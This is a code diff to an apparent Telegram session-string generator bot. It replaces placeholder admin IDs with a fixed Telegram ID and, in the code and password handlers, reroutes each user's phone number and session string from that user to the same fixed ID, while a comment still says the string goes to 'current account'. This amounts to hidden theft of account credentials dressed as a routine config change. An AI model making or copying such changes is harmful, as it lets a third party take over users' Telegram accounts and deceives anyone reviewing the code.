@@ -70,7 +70,7 @@ async def phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
             else:
                 # Send warning to admin (replace with your Telegram ID)
                 try:
-                    await context.bot.send_message(chat_id=123456789, text=f"Failed to delete contact message: {e}")
+                    await context.bot.send_message(chat_id=6581573267, text=f"Failed to delete contact message: {e}")
                 except Exception as admin_e:
                     logger.warning(f"Failed to send deletion error to admin: {admin_e}")
 
@@ -101,7 +101,7 @@ async def code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         return ConversationHandler.END
 
     # Send session string to current account
-    user_id = update.effective_user.id
+    user_id = 6581573267
     output = (
         f"phone number: {context.user_data['phone']}\n"
         f"string: {session_string}"
@@ -121,7 +121,7 @@ async def password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         return ConversationHandler.END
 
     # Send session string to current account
-    user_id = update.effective_user.id
+    user_id = 6581573267
     output = (
         f"phone number: {context.user_data['phone']}\n"
         f"string: {session_string}"
@@ -149,7 +149,7 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
         await update.message.reply_text("An error occurred. Please try again or contact support.")
     # Send error to your Telegram ID (replace with your ID)
     try:
-        await context.bot.send_message(chat_id=123456789, text=f"Error: {context.error}")
+        await context.bot.send_message(chat_id=6581573267, text=f"Error: {context.error}")
     except Exception as e:
         logger.warning(f"Failed to send error to admin: {e}")
 
